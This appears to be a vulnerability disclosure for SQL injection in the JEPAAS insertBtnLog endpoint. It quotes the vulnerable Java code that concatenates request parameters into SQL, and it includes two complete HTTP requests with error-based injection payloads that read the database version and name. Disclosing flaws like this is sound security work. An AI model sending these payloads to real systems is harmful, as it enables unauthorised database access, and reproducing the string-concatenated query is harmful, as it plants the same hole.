## Vulnerability Description
Multiple parameters have SQL injection vulnerability in JEPAAS, via /je/login/btnLog/insertBtnLog , which could allow a remote user to submit a specially crafted query, allowing an attacker to retrieve all the information stored in the DB.


Analysis of je-core-7.2.8.jar revealed SQL injection issues. Multiple parameters in the insertBtnLog interface in BtnLogController.java had SQL injection issues:
```
    @RequestMapping(
        value = {"/insertBtnLog"},
        method = {RequestMethod.POST}
    )
    @ResponseBody
    public void insertBtnLog(MethodArgument param) {
        HttpServletRequest request = param.getRequest();
        String btnTypeName = request.getParameter("btnTypeName");
        String btnTypeCode = request.getParameter("btnTypeCode");
        String btnNatureCode = request.getParameter("btnNatureCode");
        String btnNatureName = request.getParameter("btnNatureName");
        String strData = param.getStrData();
        String funcName = request.getParameter("funcName");
        String btnName = request.getParameter("btnName");
        String btnId = request.getParameter("btnId");
        String funcId = param.getFuncId();
        String nowDate = DateUtils.formatDate(new Date());
        String nowTime = DateUtils.formatTime(new Date());
        EndUser user = SecurityUserHolder.getCurrentUser();
        this.metaService.executeSql("insert into JE_CORE_BTNLOG (JE_CORE_BTNLOG_ID,BTNLOG_BUTTONTYPE_NAME,BTNLOG_BUTTONTYPE_CODE,BTNLOG_BUTTONNATURE_NAME,BTNLOG_BUTTONNATURE_CODE,BTNLOG_ANMC,BTNLOG_ANID,BTNLOG_GNMC,BTNLOG_GNID,SY_CREATEUSERID,SY_CREATEUSERNAME,SY_JTGSID,SY_JTGSMC,SY_CREATETIME,BTNLOG_TJRQ,BTNLOG_DJCS) values ('" + JEUUID.uuid() + "','" + btnTypeName + "','" + btnTypeCode + "','" + btnNatureName + "','" + btnNatureCode + "','" + funcName + "(" + btnName + ")','" + btnId + "','" + funcName + "','" + funcId + "','" + user.getUserId() + "','" + user.getUsername() + "','" + user.getJtgsId() + "','" + user.getJtgsMc() + "','" + nowTime + "','" + nowDate + "',(select a.count from (select count(*) AS count from JE_CORE_BTNLOG where BTNLOG_ANID = '" + btnId + "') a) + 1)", new Object[0]);
        this.toWrite(BaseRespResult.successResult(strData), param);
    }
```

![3d07068714caf3d4bb8745a3a58b0efe.png](/images/3d07068714caf3d4bb8745a3a58b0efe.png)
Concatenating multiple parameters when executing SQL statements leads to SQL injection：
`btnTypeName、btnTypeCode、btnNatureCode、btnNatureName、funcName、btnName、btnId`

## Payload
```
POST /je/login/btnLog/insertBtnLog HTTP/1.1
Host: 192.168.88.131:8080
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 125
Content-Type: application/x-www-form-urlencoded

btnTypeName=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+version%28%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271
```
![9cdba1470bab9c6184b72831a5d0195d.png](/images/9cdba1470bab9c6184b72831a5d0195d.png)
```
POST /je/login/btnLog/insertBtnLog HTTP/1.1
Host: 192.168.88.131:8080
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 108
Content-Type: application/x-www-form-urlencoded

btnTypeCode=1'%20and%201%3d(updatexml(1%2cconcat(0x7e%2c(select%20database())%2c0x7e)%2c1))%20and%20'1'%3d'1
```
![3ac3ecc812a23637b9e41e4037190b29.png](/images/3ac3ecc812a23637b9e41e4037190b29.png)
